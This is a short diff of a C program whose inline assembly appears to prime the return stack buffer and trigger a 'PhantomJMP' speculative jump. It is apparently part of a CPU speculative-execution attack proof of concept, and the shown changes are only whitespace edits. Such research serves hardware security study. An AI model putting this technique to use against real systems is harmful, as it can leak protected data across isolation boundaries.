@@ -196,8 +196,8 @@ int main(int argc, char *argv[]) {
             "mov $" xstr(CALL_FN_TRAIN_ALIAS) ", %%r9\n\t"
             "jmp *%%r9\n\t"
             "1: pop %%r9\n\t" ::: "r8", "r9", "r10");
-
-        // Priming RSB state
+        
+	// Priming RSB state
         asm(".secret=0\n\t"
             ".rept " xstr(RSB_SIZE) "\n\t"
             "call 4f\n\t"
@@ -208,8 +208,9 @@ int main(int argc, char *argv[]) {
             "4: pop %%r9\n\t"
             ".secret=.secret+1\n\t"
             ".endr\n\t" ::: "r8", "r9");
-
-        // PhantomJMP will be triggered
+        
+	
+	// PhantomJMP will be triggered
         asm(
             NOPS_str(512)
             "jmp a\n\t"
